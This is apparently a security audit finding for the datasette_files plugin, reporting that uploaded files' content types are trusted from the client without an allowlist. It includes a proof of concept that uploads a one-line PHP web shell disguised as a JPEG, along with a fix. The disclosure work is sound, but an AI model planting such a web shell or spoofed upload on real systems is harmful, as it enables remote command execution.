# No File Type Validation

**Severity**: Medium
**Category**: Validate Before Anything Else
**File**: `datasette_files/__init__.py` (lines 454–461)
**CVSSv3 estimate**: 5.3 (Medium)

## Summary

The upload pipeline trusts the client-provided `content_type` field without verifying it against the file's actual contents (magic bytes). There is also no allowlist of accepted file types. An attacker can upload any file type — including executables, scripts, and polyglot files — and have them served to other users with a spoofed MIME type.

## Root Cause

During the prepare step, the content type comes directly from the client's JSON body and is stored as-is:

```python
# datasette_files/__init__.py:458
content_type = body.get("content_type", "application/octet-stream")
```

No validation occurs at any point in the pipeline:
- No magic byte inspection
- No allowlist of accepted types
- No rejection of dangerous types (SVG, HTML, etc.)
- The content type is later used verbatim in the `Content-Type` response header when serving the file

## Exploit

### Reproduce with the test suite

```bash
uv run pytest tests/test_security_exploits.py::test_no_content_type_validation -v
uv run pytest tests/test_security_exploits.py::test_no_file_type_allowlist -v
```

### Spoofed content type

An attacker uploads a PHP web shell but claims it's a JPEG image:

```python
result = await _upload_file(
    ds,
    filename="shell.jpg",
    content=b"<?php system($_GET['cmd']); ?>",
    content_type="image/jpeg",  # Spoofed!
)

download = await ds.client.get(result["file"]["download_url"])
assert download.headers["content-type"] == "image/jpeg"  # Server trusts it
assert b"<?php" in download.content                       # But it's PHP
```

### No type restrictions

An attacker can upload Windows executables, shell scripts, or any other dangerous file type:

```python
result = await _upload_file(
    ds,
    filename="malware.exe",
    content=b"\x4d\x5a" + b"\x00" * 100,  # MZ header
    content_type="application/x-msdownload",
)
# Upload succeeds — no type checking
```

## Impact

1. **Bypasses any client-side type restrictions**: Even if a frontend UI restricts uploads to images, the API accepts anything.
2. **Combined with the XSS vulnerability** (report 01): an attacker can upload `text/html` or `image/svg+xml` content that contains JavaScript, and it will be served with that content type.
3. **Malware distribution**: the application becomes a vector for distributing malicious files to other users.

## Suggested Fix

```python
import magic  # python-magic

# Only accept these content types
ALLOWED_CONTENT_TYPES = frozenset({
    "image/jpeg", "image/png", "image/gif", "image/webp",
    "application/pdf",
    "text/plain", "text/csv", "text/tab-separated-values",
    "application/json",
    # Add others as needed — but NOT image/svg+xml or text/html
})

async def upload_content(request, datasette):
    # ... after reading the uploaded file ...

    # Detect actual content type from magic bytes
    detected_type = magic.from_buffer(first_chunk, mime=True)

    # Verify it matches the claimed type and is in the allowlist
    if detected_type not in ALLOWED_CONTENT_TYPES:
        return _error(f"File type not allowed: {detected_type}")

    # Use the detected type, not the client-provided one
    content_type = detected_type
```

If adding `python-magic` as a dependency is not desired, a simpler approach is to maintain a mapping of allowed extensions to content types and verify the magic bytes for the most dangerous types (SVG, HTML, PHP, executable headers).
